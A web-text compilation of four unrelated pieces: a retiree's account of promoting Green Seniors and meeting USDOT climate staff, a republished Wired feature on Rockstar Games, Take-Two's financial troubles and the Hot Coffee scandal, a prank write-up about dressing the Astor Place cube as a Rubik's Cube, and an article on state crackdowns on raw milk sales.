I felt like I had failed in my mission before I even arrived .
A few days later I found myself flying home dazed and amazed as I reviewed how it had played out .
Open hearts , willing partners
At my professional meeting I used break times to hand out my cards to everyone I knew ( most of those present ) .
For some , a conversation ensued .
For others there was only time to say , here is something I ’m working on in retirement that you might care to look at .
The conversations were all supportive and the cards were all graciously accepted , though taking such a personal action in that business setting was almost unheard of .
I did not know the political inclinations of most of those I approached .
Politics is never a good conversation topic for people in government — particularly in the highly polarized atmosphere of recent years .
We need to maintain harmony within our teams in order to get our work done , regardless of our differences .
It was possible I would offend some people by pushing a cause that had political overtones in the past .
The future of the planet is too important to be a partisan matter , I was ready to say , but I never needed to .
Concern for the planet had already taken hold — it is right under the surface for most people and in need of expression .
By the time I was having dinner with a large group of friends following the meeting , it had become much easier to talk about Green Seniors and their mission .
I had opened the door to the topic about as far as it would go that day , and I was already thinking about next steps .
Monday morning I found myself at the visitor entrance to the monolithic US Department of Transportation building in the heart of Washington .
During my trip preparations I had discovered that the USDOT had a Center for Climate Change .
I studied their material , then asked for a meeting .
A friend was ready to accompany me and provide moral support .
Only the day before my departure for Washington did I get confirmation that anyone could see us .
I was grateful but did not have high expectations .
I was a nobody imposing on the time of busy people .
A young staffer met us at the entrance .
After we went though security , she escorted us to a conference room where a senior staff member awaited us .
I ’d had no idea I would get to speak directly with the Environmental Policy Team Leader .
She was cordial , competent , and forthright .
She and her assistant had come prepared to answer the questions I had submitted in writing earlier via email .
I felt inadequate at first , but they soon put me at ease .
There was time to talk things through and to pursue ideas that came up in discussion .
The Climate Change Center is a “ virtual ” office directed by top USDOT officials and staffed with personnel time donated from various parts of the bureaucracy as needed .
I was familiar with that method of organization at the state level and believe it can be just as effective as creating a separate new office , and maybe even more so .
A virtual organization necessitates communication and cooperation among all the stakeholders , avoids duplication of administration , and reduces expenses .
In my view , global climate change belongs in everybody ’s job description in some way or other .
It ’s not something that a few work on while all others go about business as usual .
The Center is “ dedicated to fostering awareness of the potential links between transportation and global climate change , and to formulating policy options to deal with the challenges posed by these links . ”
The studies already completed included one on the impact of Hurricane Katrina on transportation .
The key data summary of the Center is a pie chart showing that in the USA , transportation accounted for 27 percent of greenhouse gas emissions during 2004 .
It was second only to electricity generation at 33 percent .
The third largest category was industry at 19 percent , with agriculture , commercial , and residential comprising the remainder .
I learned that there are many opportunities among the various modes of transportation — air , rail , highway - - for reducing greenhouse gas emissions , but that much additional research is needed to clarify what steps should be taken .
As could be expected , the Center suffers from a lack of funding for the research it needs to do .
I felt my instincts were correct : capable , dedicated people were doing good work in spite of that lack of support .
I left with my head spinning with ways that Green Seniors could help build support for the work of the Center .
I came home from my Washington trip feeling satisfied .
I may have been a novice unsure of where or how to start , but thanks to the warm reaction of everyone I encountered , I found success .
Only time will tell if I can convert the knowledge and experiences of this trip into lasting progress .
Again , I will try .
To all of the Green Seniors out there , take courage , muster your strength , and start doing the things you know will matter .
Do n’t feel intimidated .
My experience shows that volunteers are accepted and appreciated , and they will only become more so as society moves into action phases .
America is ready for you .
America needs Green Seniors !
Rockstar Gameography View Slideshow Editor 's note : On April 29 , game publisher Take - Two Interactive will release Grand Theft Auto IV , the latest entry in a series that has sold 70 million copies .
It 's the most popular and critically acclaimed M - Rated ( not for kids under 17 ) game franchise in history , and the new game is expected to earn a half billion dollars .
The game has also been a lightning rod for controversy , and Take - Two has been under investigation for financial improprieties .
We 're republishing a story that first appeared in the May 2007 issue of Wired * about the trouble that GTA - developer Rockstar Games and publisher Take - Two faced at the time .
Since the story appeared , five of the six Take Two board members have been ousted , including chief executive Paul Eibeler , and the company is fighting off a takeover bid from Electronic Arts .
A class action suit was settled over the unintentional inclusion of " scenes of a sexual nature " in the previous Grand Theft Auto San Andreas , the all - time best - selling game in the United States . *

“ There are repercussions for the choices you make , ” said Sam Houser , cofounder and president of Rockstar Games .
It was October 2002 , and I had been granted a rare interview with the gang behind the blockbuster Grand Theft Auto game franchise : Sam , his younger brother Dan , and their childhood friend Terry Donovan .
We were sitting in Rockstar 's stylish New York City office as Sam explained that concerns about the violence in his games were unfounded because GTA had a moral system hard - coded into it .
Certain actions — like hit - and - runs and drive - bys — will increase the player 's “ wanted ” level .
“ If you go around offing people , you ’ll see the police , ” he said .
Grand Theft Auto and its progeny — nearly a dozen sequels and spinoffs , including this fall ’s GTA IV — let players live out their fantasies .
But few videogame fantasies match the real - life adventures of Rockstar Games .
Almost a decade ago , a gang of young prep- school - educated Brits invaded New York with a then - outrageous dream : to make video - games hip .
They would elevate a medium built on Mario and Pokémon into something defiantly grown - up — games that would earn a place on shelves between Scarface and Licensed to Ill .
The lads at Rockstar Games scored .
With more than 50 million units sold , Grand Theft Auto titles have pulled in a billion dollars in revenue .
Along the way , the execs achieved the street cred and bad - boy rep of real rock stars .
But then , like Tony Montana face - down in a pile of blow , they hit the skids .
The trouble began five years ago , when Rockstar ’s embattled parent company , Take - Two Interactive , came under investigation by the Securities and Exchange Commission .
Since then , there have been charges of shady accounting and backdated stock options .
Last October , Ryan Brant , cofounder and onetime CEO of Take - Two , resigned .
Four months later , he pleaded guilty to falsifying business records and agreed to pay more than $ 7 million in penalties , bringing his lifetime Take - Two hit to almost $ 11 million .
He ’ll be sentenced in August , and his departure was emblematic of a company that has seen three CEOs and two CFOs leave since 2001 .
For all the financial irregularities and management shuffles , though , a few lines of code written into one of Rockstar ’s games would cause even bigger headaches .
Last June , Take - Two announced it had received a grand jury subpoena from Manhattan district attorney Robert Morgenthau seeking , among other things , documents “ relating to the knowledge of the Company ’s officers and directors regarding the creation , inclusion and programming of hidden scenes ( commonly referred to as ‘ Hot Coffee ’ ) . ”
Hot Coffee is an explicit sex minigame buried in the source code of Rockstar ’s 2004 title Grand Theft Auto : San Andreas .
Numerous lawsuits have also been filed over the scene .
The irony is thick :
The company that defined virtual criminality is now associated with the real thing .
Rockstar and Take - Two executives declined to answer questions for this article , but their rich and troubled story is revealed by official documents and former employees .
It seems the blokes forgot that in life , as in Grand Theft Auto , there are repercussions for the choices you make .
INTRO LEVEL
Dan and Sam Houser had dreamed of rock stardom since they were school kids in London .
Their dad , Wally , was co-owner of a jazz nightclub , and in the early ’ 80s the brothers developed an obsession with the hip hop scene across the pond in New York .
They would race home after a day of cutting up at St. Paul ’s School to throw on records , sneak smokes , and dream .
Sam and Dan , now 35 and 33 , idolized not only the rappers and the DJs but also producer Rick Rubin of Def Jam Recordings .
A scruffy white college geek turned impresario , he had somehow insinuated himself into hip hop culture , working with the biggest acts , injecting his own sound , and making millions on his own terms .
“ People like that inspire me so massively , ” Sam Houser told me back in 2002 .
His 18th birthday present was a trip to New York , where he bought a pair of Air Jordans and a leather jacket .
The Housers were n’t the only wannabe rock stars at St. Paul’s .
The father of their pal and classmate Terry Donovan directed the iconic video for the Robert Palmer song “ Simply Irresistible , ” and Terry DJ ’d at techno clubs .
Looking to break into the music industry , the youths all took jobs at BMG Music in London .
Sam and Dan worked on lame in - house concert videos .
Donovan was a self - described “ A&R chap ” who signed fledgling bands to sublabels .
When BMG launched an interactive division in 1993 , the three friends jumped at the chance to work there , even though the Housers ’ previous exposure to game design was fiddling around on a Sinclair ZX Spectrum , and the extent of Donovan ’s coding experience was getting his computer to write TERRY IS COOL .
The videogame industry works like the record industry : Labels put out CDs created by bands , and publishers put out software created by developers .
Titles that do well pay for the flops .
BMG
Interactive released several games in the mid-1990s , but its big break came when it received a pitch from a developer in Scotland for a game called Race and Chase .
The graphics were primitive , with an overhead point of view that looked like you were pushing toy Hot Wheels cars through a maze .
But the game ’s urban environment teemed with mobsters and thugs , and gameplay centered around boosting cars , rubbing out enemies , and rising through the underworld .
For the young Brits weaned on Run DMC and The Warriors , it was a revelation .
“ Here was a game that was commenting on the world , ” Dan said to me that day nearly five years ago .
Race and Chase was signed and renamed Grand Theft Auto .
The gameplay was surprisingly unconstrained .
The only limitation was your “ wanted ” level : Cause enough mayhem and a cop ’s face would appear on a meter at the top of the screen .
Police cars would give chase if they spotted you .
Commit more egregious crimes and your wanted level increased .
Now an in - game APB was put out on you .
At wanted level three , police would begin to set up roadblocks .
If you got busted , you got carted off to jail and your weapons were confiscated .
But that was the extent of the limits .
“ The problem with other games is that when you hit a point that ’s frustrating , you ca n’t get past it , ” Sam Houser told me .
“ In Grand Theft Auto , when you hit a point that ’s tough , just go do something else .
That ’s fucking great ! ”
In 1998 , BMG ’s games division was bought by Take - Two Interactive , a scrappy publisher in New York .
It seemed like a good match .
Take - Two had been launched in 1993 by a 21 - year - old named Ryan Brant .
Like Donovan and the Housers , he was born into a media family .
His father , Peter Brant , owned magazines like Interview and Art in America , cofounded the Greenwich Polo Club … and had spent time in jail for tax evasion .
Take - Two ’s games , such as Ripper and Hell : A Cyberpunk Thriller , had adult subject matter , cinematic pretensions , and a deliberate , if ham - handed , edginess .
But they were poorly received .
That ’s where Donovan and the Housers came in .
The Londoners had attitude , style , and what Dan Houser later called a “ culturally relevant , detail - obsessed approach ” to game - making .
They moved their core team to New York and assumed the name Rockstar Games .
( The group of coders and designers in Scotland was eventually acquired by Take - Two and renamed Rockstar North . )
The name hinted at their ambitions .
“ We admired record labels , obviously , and clothing companies , which were obsessed with details and with an integrity between design , product , and marketing , ” Dan told the Design Museum of London in 2003 .
Rockstar would n’t just sell games — it would sell a lifestyle .
WANTED LEVEL : ONE
Rockstar Games started out in a cramped ground - floor apartment in New York ’s SoHo district nicknamed the Commune .
When the new execs were n’t working on their next game , they were soaking up American culture .
“ We were staggered by what was on television , ” Donovan told me in 2002 .
To promote Grand Theft Auto 2 in 1999 , they hosted a series of parties called Rockstar Loft .
Just gaining entry was a game :
To get directions , club - goers had to call a number and leave their contact info .
They ’d get called back and have to answer questions like “ What has been the best moment in your life so far ? ”
GTA 2 , which still had the Hot Wheels top - down viewpoint of the original , sold as well as its predecessor : about 2 million copies .
A respectable figure , but it left the upstarts chastened .
“ We realized how hard being a game publisher is .
We ’ve actually got very serious , proper jobs here , ” Sam told me .
He micromanaged production of GTA III , coaxing the team in Scotland to create something of unprecedented ambition .
The game threw players face - first into a gory 3 - D gang world .
Released in October 2001 , it sold five times as well as its predecessors .
What made GTA III so popular was the range of options it offered players .
Steal a car and you could explore the sprawling metropolis of Liberty City .
You could drive to the hideouts of one of the many crime lords and get a lucrative assignment .
You could jump off ramps like Bo and Luke in The Dukes of Hazzard .
Or boost a taxicab and pick up fares .
Or climb into a fire truck or ambulance and be a vigilante do - gooder , dousing flames and saving lives .
Or , as the media was quick to report , you could pick up a prostitute in order to boost your health meter , then kill her to get your money back .
It was just one possible course of action in a game that presented players with literally millions of options , but in the eyes of the general public it came to epitomize Rockstar ’s blockbuster .
Like the Rolling Stones , Twisted Sister , and Marilyn Manson before it , GTA III was blamed for the supposed corruption of a generation .
Following the game ’s release , US representative Joe Baca , a Democrat from Southern California , introduced the Protect Children from Video Game Sex and Violence Act of 2002 , asking , “ Do you really want your kids assuming the role of a mass murderer or a carjacker while you are away at work ? ”
Australia banned the game , and several lawsuits were filed , including a 2003 suit claiming the game inspired two Tennessee teenagers to shoot passersby , killing one and wounding another .
That case sought $ 246 million in damages .
Not that such developments ever seemed to roil the Rockstars .
“ PlayStation players are n’t all 10 years old , ” Donovan told me .
“ There is n’t some kind of social responsibility to have a redeeming value .
Your responsibility is to provide a toolkit with which young adults can entertain themselves . ”
The legislation never passed , the lawsuit failed , and — of course — the controversy helped boost sales .
WANTED LEVEL : TWO
Take - Two Interactive had a hit franchise , and its stock went from $ 7 a share in October 2001 , three weeks before the launch of GTA III , to almost $ 20 the following January .
But then came those nasty repercussions .
That month , the Nasdaq halted trading of the company ’s stock for three weeks after Take - Two announced it would be restating earnings reports .
The SEC also launched an investigation into its financials .
It seemed that while the punks at Rockstar were off creating an invaluable piece of gaming IP , the bosses at Take - Two had quietly been playing a little game of their own called “ parking transactions . ”
The SEC alleged that on Halloween day 2000 , executives at Take - Two recorded a single shipment of 230,000 videogames for $ 5.4 million , its biggest sale to date .
But the games were soon sent back to HQ .
To hide their return , Take - Two disguised it as a purchase of “ assorted products . ”
According to the SEC , the company improperly recognized $ 60 million in revenue from 180 different parking transactions in 2000 and 2001 .
In June 2005 , the SEC revealed its findings in a settlement agreement under which Take - Two paid $ 7.5 million in penalties — but admitted no wrongdoing .
It did n’t end there , though .
Brant was charged by the SEC with awarding himself 2.1 million shares of backdated option grants between 1997 and 2003 — a period during which the stock price fluctuated by about $ 30 — and several other Take - Two executives received an undisclosed number of backdated shares .
As all this played out at Take - Two , the Rockstars continued their rise .
Dan Houser assumed the creative reins , writing game dialog and directing star - studded voice - over sessions .
Sam Houser , president and executive producer , played the charismatic visionary .
He hung a poster in his office of Don Simpson , the infamous playboy producer of films like Flashdance and Top Gun .
To create their next game , the Housers jetted members of their development team to Miami on a fact - finding mission .
Grand Theft Auto : Vice City would be a fun -house - mirror version of Florida circa 1986 , drawing on TV’s Miami Vice , the film Scarface , and other ’ 80s iconography .
The secret to a Rockstar game is the style , mood , and setting — what the Housers call its “ vibe . ”
When Vice City was released in October 2003 , its white - sand beaches , period hairstyles , and vintage clothing were impeccable .
Seven CDs ’ worth of music from the era blared from car radios and nightclubs , everything from REO Speedwagon to Rick James .
Voice - overs featured talent like Dennis Hopper as a seedy porn film director , Burt Reynolds as a corrupt land baron , and Philip Michael Thomas as the treacherous sidekick of the protagonist , voiced by Ray Liotta .
Porn star Jenna Jameson recorded dialog for the aptly named character Candy Suxxx .
In the fiscal year following the game ’s release , Take - Two ’s revenue topped $ 1 billion .
At the same time , the Rockstar brand itself was becoming cool .
Rockstar promoted GTA games by plastering stickers all over the city , as if it were a band .
Donovan , who ran the marketing arm of the company , helped burnish its outlaw image .
While most game companies mail journalists promotional T - shirts , Rockstar ’s PR schwag became the stuff of legend : A barbed - wire garrote was sent out to reviewers of Manhunt , a game about a homicidal reality TV show .
By 2004 , it had become a badge of hipness to wear a T - shirt with the company ’s logo or to blast its soundtrack albums in your car .
Grand Theft Auto was parodied on Chappelle ’s Show and name - checked on a hip hop track by rapper Cam’ron .
Rockstar Games had achieved the cultural cachet that Def Jam had in the 1980s , and the prep - school boys had become real - life rock stars .
WANTED LEVEL : THREE
Rockstar Games moved to an even bigger loft down Broadway .
The company gobbled up more game development houses to complement its satellite studios in Vienna , San Diego , and Vancouver .
Many execs bought fancy cars and homes .
But as one former employee puts it , “ The money turned them into jackasses very quickly . ”
The Housers became increasingly demanding .
Gillian Telling , a former assistant to Dan , remembers being commanded to clean snow out of his home satellite dish .
When she failed to bring in the right kind of bagel , she says he called her a “ useless whore ” and a “ cunt . ”
Former employees say they routinely heard yelled insults and slammed telephones .
“ These people are insanely smart and really good at being mean , ” says one .
“ They ’re British . ”
But , others argue , the tirades were part of the Housers ’ overarching obsession with quality .
“ That ’s the only reason the games are so good , ” says former Rockstar producer Marc Fernandez .
“ It was the most exhilarating , impassioned place — they were totally committed to perfection .
Imagine a company where 100 people felt like they were in the Beatles . ”
The release of Grand Theft Auto : San Andreas on October 26 , 2004 , sent the Rockstar ego trip into overdrive .
In just two months , it sold 5 million copies at 50 bucks a pop .
San Andreas is set on the West Coast in the early ’90s .
The action takes place in a Boyz n the Hood - style LA , an ersatz Bay Area complete with Haight - Ashbury hippies , and a glitzy Las Vegas .
Fans and critics called it the company ’s masterpiece .
To deflect charges that its games encouraged players to mistreat women , Rockstar created a new challenge for San Andreas : dating .
To impress women in the game , players have to learn their tastes .
Get your avatar a hairstyle and wardrobe she likes , pump iron at one of the in - game gyms , and she might let you take her out .
Buy her flowers , drive her to a restaurant and a club , and maybe at the end of the night she ’ll invite you in for some “ coffee . ”
As she and your avatar disappear into her house , your health meter rises , and you hear their moans through the door .
As the success of San Andreas climaxed , so did the obsession with image control at the Rockstar loft .
A former employee describes nights when top executives would sit at their computers , anxiously waiting for the reviews of their newest games to be posted online .
An even slightly negative write - up would ignite “ a shitstorm of … yelling and screaming . ”
The editor of one major videogame magazine describes the relationship with Rockstar as “ a constant fight ” because the company would jockey for sympathetic reviewers .
With GTA fever riding high , the antics of some of its top brass were overlooked by the gaming press and the public .
But it would take just one scalding cup of joe to send the Rockstars plummeting back to earth .
WANTED LEVEL : FOUR
“ Do n’t answer your phones !
This is going to get ugly . ”
It was June 9 , 2005 , almost eight months after the release of GTA : San Andreas and , according to a former member of Rockstar ’s PR team , Terry Donovan was ordering them to lay low .
The day had started horribly and gotten worse .
In the morning , the company put out a press release breaking the news of Take - Two ’s $ 7.5 million penalty as a result of the SEC investigation into parking transactions .
But that was n’t their only problem .
Across the Atlantic , a gamer in the Netherlands named Patrick Wildenborg blogged on his site that he had unlocked a hidden scene in the PC version of San Andreas .
“ Rockstar build [ sic ] all this stuff in the game , ” Wildenborg wrote , “ but decided to disable it in their final release . ”
He released a mod on GTAgarage.com that changed the climactic sequence of the dating missions , showing what happens behind the closed door after your character gets invited into his girlfriend ’s house .
And you do n’t just watch — it ’s interactive .
Hit the Shift key to switch sex positions ; tap the up and down keys to thrust your avatar ’s pelvis .
High scores are awarded for getting the girl off .
In a mainstream videogame , characters are allowed to bludgeon , blast , amputate , eviscerate , and decapitate , but they ca n’t have sex .
A voluntary industry group called the Entertainment Software Ratings Board evaluates and rates games according to content .
GTA games were rated M ( mature ) , the equivalent of an R rating for a film .
If San Andreas contained explicit sexual content , that would kick its rating up to AO ( adults only ) — a death sentence , since most retailers refuse to stock AO titles .
Rockstar unleashed crisis expert Rodney Walker to do spin control .
Walker told me a few days after the furor erupted that the people responsible for the sex scene were “ not within the company . ”
About a month after the discovery , a Rockstar press release characterized Hot Coffee as “ the work of a determined group of hackers who have gone to significant trouble to alter scenes in the official version of the game . ”
But Wildenborg insisted that hackers had n’t created the content — he merely found it .
“ The script code , the models , the animations , and the dialog by the original voice actors were all created by Rockstar , ” he wrote on his site .
The gamer press soon confirmed that this was n’t the work of the PC modding community , posting instructions on how to access the scene with the aid of a cheat disc and a series of codes in the original PlayStation 2 version of the game .
One ex-Rockstar employee claimed that Hot Coffee had always been in the game .
“ I knew it existed in April ” — a full two months before Wildenborg ’s mod — the alum said .
“ They released that bullshit quote about how this is the act of hackers , which is completely comical , ” the ex-employee added .
Maybe the Hot Coffee sequence was created by an employee in his downtime as a gag and mistakenly left in the final product .
Maybe it was made by a disgruntled coder intent on sabotage .
Or maybe it was deliberate , a logical culmination of Rockstar ’s efforts to push the limits of what games could do and be , but was then disabled for reasons unknown : tastefulness , propriety , or the simple fact that it was n’t much fun .
One thing is certain :
The scene was n’t supposed to be found .
Companies often leave unused programming in their games .
It ’s costly and time - consuming to comb through millions of lines of code to root out every unwanted element ( and then verify that the deletions do n’t break something else ) .
Usually it ’s cheaper to simply hide it so that it ’s inaccessible to players , in the belief that no one will have the time and energy to hunt for it .
But if GTA players have anything , it ’s time and energy .
Under the hood of San Andreas , Wildenborg discovered the various elements of the scene and tweaked a few lines of code to reassemble them .
On July 20 , Rockstar confirmed the game was now AO - rated .
It made a patch available for the PC version and recalled all copies from store shelves — at a cost of $ 25 million , according to the Federal Trade Commission .
Then it rereleased the game with the offending material excised .
Even though an elaborate series of hacks had been required to access it , Hot Coffee touched off a firestorm that made Rockstar ’s previous scandals seem tame .
WANTED LEVEL : FIVE
“ The disturbing material in Grand Theft Auto and other games like it is stealing the innocence of our children . ”
So declared US senator Hillary Clinton soon after the discovery of Hot Coffee .
The city of Los Angeles filed suit over the fact that Take - Two released an M - rated game containing AO - rated material .
“ Greed and deception are part of the Grand Theft Auto : San Andreas story — and in that respect , its publishers are not much different from the characters in their story , ” said Los Angeles city attorney Rocky Delgadillo .
Numerous additional civil suits were launched .
In New York , for example , an 85 - year - old grandmother wanted $ 5 million in damages after realizing that the gift she bought her 14 - year - old grandson contained hidden porn .
And several states , including California , Michigan , and Illinois , are fighting to ban the sale of M - rated games to minors .
The Hot Coffee scene confirmed all of the hysterical , overblown suspicions about Grand Theft Auto .
And Rockstar ’s publicity department , which in the past had displayed an uncanny knack for building brand mystique , only seemed to exacerbate the outrage .
“ Blaming it on hackers was a colossal PR screwup , ” says Corey Wade , a former senior product manager at Rockstar .
Rockstar has since refused to comment on Hot Coffee , a move that has earned it the ire of many in the game industry .
“ If you want to be controversial , that ’s great , ” said Doug Lowenstein , outgoing president of the Entertainment Software Association , at an industry gathering in February .
“ But then do n’t duck and cover when the shit hits the fan .
Stand up and defend what you make . ”
Though he never mentioned Rockstar or Take - Two by name , the gaming press figured out his implied target .
At the same time , Take - Two was grappling with other problems .
In January 2006 , Barbara Kaczynski — a board member and former CFO of the National Football League who had been brought in to chair the audit committee after the SEC investigations began — resigned , citing the “ increasingly unhealthy relationship between senior management and the board of directors ... characterized by a lack of cooperation and respect . ”
In October , Brant resigned from the company he founded .
On December 11 , Take - Two announced that it would be restating financial results from 1997 to April 30 , 2006 .
And in February , Brant pled guilty to backdating stock options , paid an additional $ 7.3 million in penalties , and accepted a lifetime ban on serving in a management position of a public company .
Then , on March 29 of this year , an investor group including several prominent hedge funds voted to replace Take - Two ’s CEO and most of its board at the company ’s annual shareholder meeting .
Rumors began to circulate that the company might be sold .
( Tellingly , the stock jumped on initial reports of both of these developments . )
Many noted that potential purchasers had to balance the upside of Rockstar ’s immensely profitable GTA franchise against the downside of the many lingering SEC investigations , class actions , and grand jury subpoenas .
UNWANTED
It ’s August 25 , 2006 , seven weeks before the release of Rockstar ’s latest game , Bully , and there ’s a crowd outside the company ’s doors .
“ This game is bananas ! B - a - n - a - n - a-s ! ” they chant .
They call themselves PeaceOholics , and they ’re outraged about the new game , which they ’ve never seen or played .
One protest leader says the guys in Rockstar are “ worse than terrorists . ”
Bully turned out to be brilliant .
It mashed up tropes from sources like The Outsiders , The Catcher in the Rye , and Sixteen Candles to create an archetypal high school setting .
Just as GTA players must ingratiate themselves with the mob , the yakuza , and the triads to advance , players of Bully must win over the geeks , the jocks , and the preps .
There ’s no murder or sex .
The game earned a T rating — OK to sell to anyone 13 and up .
Still , two months before Bully ’s release , attorney Jack Thompson , a vocal opponent of violent videogames , filed a petition to prevent Wal - Mart and other major retailers from selling it on grounds that the game qualified as a public nuisance .
His case was swatted down by Miami - Dade County circuit court judge Ronald Friedman .
“ There ’s a lot of violence , ” Friedman conceded , but “ less than we see on television every night . ”
Even though major retailers ultimately carried the game , sales of Bully fell flat .
The year before , Rockstar ’s adaptation of the 1979 film The Warriors met a similar fate .
And now , even the reliable GTA cash cow is ailing .
GTA : Vice City Stories , a spinoff for the Sony PSP handheld released in October and ported to PS2 in March , is the worst - selling game in the history of the franchise .
Furthermore , many key members of the team have left in the past two years , including cofounder Jamie King , Sam Houser ’s right - hand man , who ’d been with him since the BMG Interactive days .
Terry Donovan , the marketing genius behind Rockstar ’s larger - than - life image , is gone too .
Without them , it will be harder than ever for the company to struggle back to the top of the charts .
Rockstar Games still has a chance to press the Reset button .
On October 16 , the company will release the hotly anticipated Grand Theft Auto IV , created for the latest generation of game consoles .
If it ’s as successful as San Andreas , it could help pay all the fines , penalties , and settlements of outstanding cases against Rockstar and Take - Two .
Sam Houser has always felt somewhat besieged .
Back in 2002 , he told me : “ More people in this country would like to see us thrown out or locked up than doing what we do . ”
Perhaps that ’s why , in Grand Theft Auto , there ’s always an easy fix :
No matter how many cops are on your tail , you can drive into any auto body shop , get a fresh coat of paint for your car , and your wanted level will drop to zero .
It ’s not that easy in real life .

Astor Cube
One of the most prominent landmarks in the East Village in Manhattan is a statue of a giant steel cube .
The cube was built at Astor Place in 1968 , and has stood there ever since .
The cube can spin on its axis , which is pretty entertaining the first time , and requires a few people to get it moving .
Typically surrounding the cube is an endless supply of skateboarders and Goth kids , as the cube has become a central hangout for many East Village kids and runoff from St. Marks Place .
The cube sits directly in front of the most crowded Starbucks in New York City - so popular that they built a second one on the opposite corner and that one is constantly packed too !
The cube is right next to a 6 train subway line , with thousands of commuters passing through every morning .
What an amazing place to pull off a prank !
So in true All Too Flat style , we decided the plain black cube would look nicer as the world 's largest Rubik 's Cube !
We were all really excited about the Rubik 's Cube prank .
The first thing we needed to do was scope out the site and take some measurements and see what the scene was like late at night .
So we went out with some tape measures and a camera to gather some stats .
The cube measures 8'x8 'x8 ' ( 2.44 m ^3 ) .
It is standing on one vertex , such that the tippy top reaches around 12 ' in the air ( see kids - geometry and trig DO have applications in real life !
Remind me to make a Pythagoras Trading Card when this is over ) .
Oh , and I 'm supposed to give credit where credit is due ( we got a C&D ) , so I 'd like to mention that the cube is technically called the Alamo .
Here are some interesting facts about it and the artist and his copyright :

Here is a picture comparing the size of the cube to a Ford Explorer and a Chevy Trailblazer ( because we all know exactly how big a Trailblazer is ) :
After all our measurements were taken , we created an artist 's rendering of what we hoped the finished Rubik 's Cube would look like :
Next we set upon the difficult task of planning how to build this darn thing .
8 feet by 8 feet does n't sound that big until you trace it out on the floor of your apartment .
Then you realize the task at hand it a little more difficult that you initially thought .
We were pretty sure we wanted to use cardboard to cover the cube .
We definitely did n't want to paint it or do anything destructive .
So we began gathering boxes .
There are always a ton of boxes being recycled in NYC on the street , so we figured there would be no problem .
But after picking up a few , we again remembered exactly how big this cube was .
All told , we needed 382 square feet of cardboard .
Spread out , that is almost 20 'x20 ' .
So we met with an artist / architect consultant and discussed possible solutions over half priced margaritas .
Because doors generally are n't 8 ' tall , we realized we'd have to do a lot of the assembly outside .
At the end we decided the best plan would be to create nine 32 " x32 " cardboard squares for each side .
We could then assmble the sides outdoors the night of the prank .
We needed 54 panels .
After some more deliberation and cutting apart boxes with an Xacto knife , we decided to find a cardboard wholeseller and buy sheets of cardboard .
Kennyb got in his truck and went to pick up 60 sheets of cardboard , each measuring 30 " x40 " .
Ben showing off our larger - than - life card tower :
We trimmed off one end and were left with perfect 30 " x30 " squares .
Sweet .
Next we bought some tempera paint and set off to do some painting .
The colors of the Rubik 's Cube are :
Red
Orange
Yellow
Green
Blue
White
It 's important to make sure that the colors are on the correct sides of the cube too .
We decided to pose this as a logic puzzle .
Here are the clues :
Three touching sides have the same colors as the American flag
The two lightest colors do not touch each other
An acronym for one of the sides is B.O.W
Ton spent much of the preparation time looking thoughtfully at our model cube and figuring out which colors should go where .
We even created colored panels for our little model :
We decided the best way to connect the panels was brute force duct tape .
We debated building a stronger frame possibly out of wooden dowels or polystyrene parallelpipeds , but they cost waaay too much .
And at the end of the day , what is more useful than duct tape ?
Nothing .
We also figured that the more work we did before we got outside , the better , so we connected every 2 adjacent squares while we were still inside .
At around 1:30 am we hopped in the truck to head to the East Village to meet our team for our 3 am rendevous .
Next : On to the deployment !
In many states , you can possess it , but the law prohibits its sale .
It is a violation of federal law to transport the substance across state lines with the intent to sell it .
In many states , undercover investigators are at work trying to uncover the furtive networks that produce and distribute the stuff .
Dealers have been pulled over and spectacular quantities of the contraband substance have been seized by triumphant investigators .
Is this a tale from the War on Drugs ?
Not exactly .
But it is a tale from the war many states are conducting on those who sell raw milk .
That 's right , there is a dangerous underground of dairy devotees who prefer to drink their milk straight from the cow , sans pasteurization and homogenization – and government is increasingly out to stop them .
Some states , in fact , equate the sale of raw milk with the sale of drugs .
Consider this from Washington Post reporter Thomas Bartlett :
The issue of selling raw milk is , legally speaking , dicey .
To determine exactly how dicey , I call Ted Elkin , deputy director of the Office of Food Protection and Consumer Health Services at the Maryland Department of Health and Mental Hygiene .
Elkin is in charge of making sure the state 's dairy laws are enforced .
" So , " I begin carefully , " Maryland 's position on raw milk is . . .? "
" Raw milk is illegal for sale , " Elkin says .
" Period . "
" Huh , " I reply .
To help drive this point home , he compares selling raw milk to selling pot .
" Interesting , " I say .
At that moment , I am standing in my kitchen with the fridge door open , staring at my gallon of possible contraband .
This seems positively surreal , like some parody of the war on drugs aired on Saturday Night Live .
Proof that the war on contraband milk is taken all too seriously by some state officials , Bartlett 's conversation with Elkin next turned frighteningly serious .
Noting that Maryland lacks the resources to track down all users of raw milk , Elkin suggested that the state might eventually catch them .
" Using an analogy , Elkin explains that a small - time heroin dealer in Baltimore might be able to elude the authorities for quite a while , " Bartlett wrote of his interview with Elkin .
" So , during our conversation , raw milk was compared to marijuana and heroin .
What 's more , Hitler 's secret police were mentioned – in passing , sure , but still . "
Just like the War on Drugs , the War on Raw Milk is serious business .
Just ask farmer Richard Hebron .
According to Time magazine , in October of last year the Michigan man was pulled over by police near Ann Arbor .
According to Time , when police pulled him over , they " ordered him to put his hands on the hood of his mud-splattered truck and seized its contents : 453 gal. of milk . "
Hebron had already been the subject of a large sting operation conducted by state Ag officials .
As Time reported , " An undercover agricultural investigator had infiltrated the co-op as part of a sting operation that resulted in the seizure of $ 7,000 worth of fresh - food items , including 35 lbs. of raw butter , 29 qt. of cream and all those gallons of the suspicious white liquid .
Although Hebron 's home office was searched and his computer seized , no charges have been filed .
' When they tested the milk , they could n't find any problems with it , ' says Hebron .
' It seems like they 're just looking for some way to shut us down . ' "
Similar sting operations have been conducted in other states , including in Wisconsin , America 's erstwhile " Dairy State , " where one might expect officials to have a slightly more generous attitude toward the state 's beleaguered dairy farmers .
Why the fuss over raw milk ?
Before the advent of pasteurization , raw milk was widely consumed and was implicated in disease outbreaks in during the 19th century that caused many deaths in American cities .
But that milk , according to some , was often contaminated in ways that would be inconceivable today .
" Milk was commonly mixed with additives to gain profit , " wrote author Laurie Winn Carlson in her book Cattle , a history of the cow .
" Then , to make it look whole , additives were mixed in , such as carbonized carrots , grilled onions , caramel , marigold petals , chalk , plaster , white clay and starch .
To replace the cream that had been removed , emulsions of almonds and animal brains were dissolved in the liquid to thicken it . "
Today , raw milk supporters say , the product is safe .
In California where the sale of raw milk is legal , Organic Pastures Dairy says it has sold more than 40 million servings of raw milk without complaint .
Moreover , raw milk advocates say the product is part of a healthy diet .
Pasteurization , they say , destroys important enzymes and beneficial bacteria that exist in milk .
